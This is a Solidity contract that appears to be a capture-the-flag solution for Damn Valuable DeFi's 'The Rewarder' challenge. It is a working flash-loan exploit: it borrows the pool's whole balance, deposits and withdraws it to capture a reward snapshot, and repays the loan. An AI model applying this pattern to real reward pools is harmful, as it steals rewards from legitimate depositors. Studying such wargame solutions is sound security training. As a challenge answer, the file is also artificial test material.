// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../DamnValuableToken.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../the-rewarder/TheRewarderPool.sol";

contract TheRewarderAttack {
    DamnValuableToken public token;
    FlashLoanerPool public pool;
    RewardToken public rewardToken;
    TheRewarderPool public rewardPool;

    constructor (address _token, address _pool, address _rewardToken, address _rewardPool)
    {
        token = DamnValuableToken(_token);
        pool = FlashLoanerPool(_pool);
        rewardToken = RewardToken(_rewardToken);
        rewardPool = TheRewarderPool(_rewardPool);
    }

    function attack() external {
        pool.flashLoan(token.balanceOf(address(pool)));
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    fallback() external {
        uint256 amount = token.balanceOf(address(this));

        token.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        token.transfer(address(pool), amount);
    }
}